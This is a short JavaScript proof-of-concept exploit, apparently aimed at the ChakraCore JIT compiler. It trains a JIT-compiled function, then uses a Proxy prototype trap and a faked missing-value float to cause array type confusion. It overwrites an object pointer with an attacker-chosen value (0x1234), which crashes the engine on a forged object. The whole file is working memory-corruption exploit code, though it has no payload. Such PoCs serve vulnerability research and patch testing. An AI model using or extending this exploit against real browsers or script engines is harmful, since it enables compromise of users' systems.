function jit(arr, buggy){
    let tmp = [1.1];
    arr[0]= 1.1;      //  arr -> NativeFloatArray
    let res = tmp.concat(buggy); //arr converted to JavascriptArray
    arr[0]= 2.3023e-320 //over write a pointer in the JavascriptArray with '0x1234'
}

function main(){
    for(let i=0; i<0x10000; i++){
        let tmp = [1.1,2.2,3.3]; 
        jit(tmp,[1.1]);  //make jit expect 2 float array
    }
    let buggy=[1.1,{},{}]; // array with float var
    let arr = [1.1]; //used as target for type confusion
    arr.getPrototypeOf=Object.prototype.valueOf; //use valueof to bypass the side effect constraint
    buggy.__proto__=new Proxy([],arr); //the trapped GetPrototype() will return 'arr' as NativeFloatArray
    buggy[0] = 5.5627483035514150e-309; //insert a faking missing value to the array
    jit(arr,buggy);
    console.log(arr);  //crash on faked object 0x1234
}

main();